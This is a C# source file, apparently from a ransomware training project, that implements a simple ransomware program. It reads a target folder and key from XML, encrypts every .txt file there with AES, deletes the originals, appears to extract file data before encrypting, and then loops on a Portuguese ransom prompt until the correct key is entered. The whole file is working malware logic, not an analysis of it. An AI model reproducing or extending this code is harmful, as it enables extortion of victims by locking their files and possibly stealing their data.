
namespace Ransomware_Training;

class Program
{
    static void Main(string[] args)
    {
        string ransomMessage = RansomMessage.Message;

        string dir = SecurityManager.ReadDirFromXml();
        string encryptionPassword = SecurityManager.ReadEncryptionPasswordFromXml();
        List<string> files = new List<string>();
        DirectoryInfo dirInfo = new DirectoryInfo(dir);

        bool isPayed = SecurityManager.ReadStatusFromXml("isPayed");
        bool isEncrypted = SecurityManager.ReadStatusFromXml("isEncrypted");

        foreach (var file in dirInfo.GetFiles("*.txt"))
        {
            files.Add(file.ToString());
        }

        if (!isEncrypted) 
        {
            Encrypt(files, dir, encryptionPassword);
            SecurityManager.UpdateStatusInXml("isPayed", false);
        }

        while (!isPayed)
        {
            string password = SecurityManager.ReadPassword(ransomMessage + "\r\n\r\nEntrar a chave de descriptografia: ");

            if (!string.IsNullOrEmpty(password))
            {
                if (password == encryptionPassword)
                {
                    SecurityManager.UpdateStatusInXml("isPayed", true);
                    SecurityManager.UpdateStatusInXml("isEncrypted", false);
                    Decrypt(files, dir, encryptionPassword);
                    break;
                }
                else
                {
                    Console.WriteLine("Senha errada. Descriptografia abortada.");
                }
            }
            else
            {
                Console.WriteLine("Nenhuma senha inserida. Descriptografia abortada.");
            }
        }
    }

    private static void Encrypt(List<string> files, string dir, string encryptionPassword)
    {
        foreach (var file in files)
        {
            ExtractorDatas.Extract(file);

            string tempFileName = Path.Combine(dir, Path.GetFileNameWithoutExtension(file) + "_encrypted" + Path.GetExtension(file));
            SharpAESCrypt.SharpAESCrypt.Encrypt(encryptionPassword, file, tempFileName);
            File.Delete(file);
            File.Move(tempFileName, file);
        }
        SecurityManager.UpdateStatusInXml("isEncrypted", true);
    }

    public static void Decrypt(List<string> files, string dir, string encryptionPassword)
    {
        foreach (var file in files)
        {
            string tempFileName = Path.Combine(dir, Path.GetFileNameWithoutExtension(file) + "_decrypted" + Path.GetExtension(file));
            SharpAESCrypt.SharpAESCrypt.Decrypt(encryptionPassword, file, tempFileName);
            File.Delete(file);
            File.Move(tempFileName, file);
        }
    }

}
